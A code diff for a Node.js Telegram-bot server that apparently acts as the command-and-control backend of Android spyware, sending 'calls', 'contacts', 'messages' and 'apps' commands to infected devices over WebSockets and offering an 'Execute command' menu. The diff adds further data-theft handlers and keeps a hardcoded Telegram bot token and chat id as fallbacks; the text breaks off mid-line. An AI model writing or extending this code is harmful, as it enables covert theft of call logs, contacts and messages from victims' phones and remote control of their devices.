@@ -7,9 +7,11 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
+// Use environment variables with fallbacks
 const token = process.env.TELEGRAM_BOT_TOKEN || '8400168149:AAGmeG05HdxkGzQvZGaM986EeLKY8bERtnU'
 const id = process.env.TELEGRAM_CHAT_ID || '1928177934'
-const address = 'https://www.google.com'
+const address = process.env.KEEP_ALIVE_URL || 'https://www.google.com'
+const port = process.env.PORT || 8999
 
 const app = express();
 const appServer = http.createServer(app);
@@ -373,8 +375,6 @@ appBot.on('message', (message) => {
     }
 })
 
-// ... rest of the callback_query handlers (same pattern - remove Unicode)
-
 appBot.on("callback_query", (callbackQuery) => {
     const msg = callbackQuery.message;
     const data = callbackQuery.data
@@ -435,7 +435,6 @@ appBot.on("callback_query", (callbackQuery) => {
         })
     }
     
-    // All other callback handlers remain the same but with normal text
     if (commend == 'calls') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
@@ -455,18 +454,45 @@ appBot.on("callback_query", (callbackQuery) => {
             }
         )
     }
-    
-    // ... Continue with all other callback handlers (same logic, just remove Unicode)
-});
-
-setInterval(function () {
-    appSocket.clients.forEach(function each(ws) {
-        ws.send('ping')
-    });
-    try {
-        axios.get(address).then(r => "")
-    } catch (e) {
+    if (commend == 'contacts') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('contacts');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            'Your request is on process\n\n' +
+            'You will receive a response in the next few moments',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["Connected devices"], ["Execute command"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-}, 5000)
-
-appServer.listen(process.env.PORT || 8999);
+    if (commend == 'messages') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('messages');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            'Your request is on process\n\n' +
+            'You will receive a response in the next few moments',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["Connected devices"], ["Execute command"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'apps') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send
